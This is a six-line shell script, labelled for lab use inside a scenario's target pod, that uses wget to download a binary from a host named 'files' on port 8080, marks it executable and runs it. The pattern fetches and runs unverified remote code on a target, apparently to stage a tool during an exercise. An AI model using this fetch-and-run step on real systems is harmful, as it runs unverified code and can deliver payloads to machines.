#!/bin/sh
# SPDX-License-Identifier: Apache-2.0
# Lab use only. Runs inside the scenario's target pod.
wget -q -O /tmp/tool http://files:8080/tool
chmod +x /tmp/tool
/tmp/tool
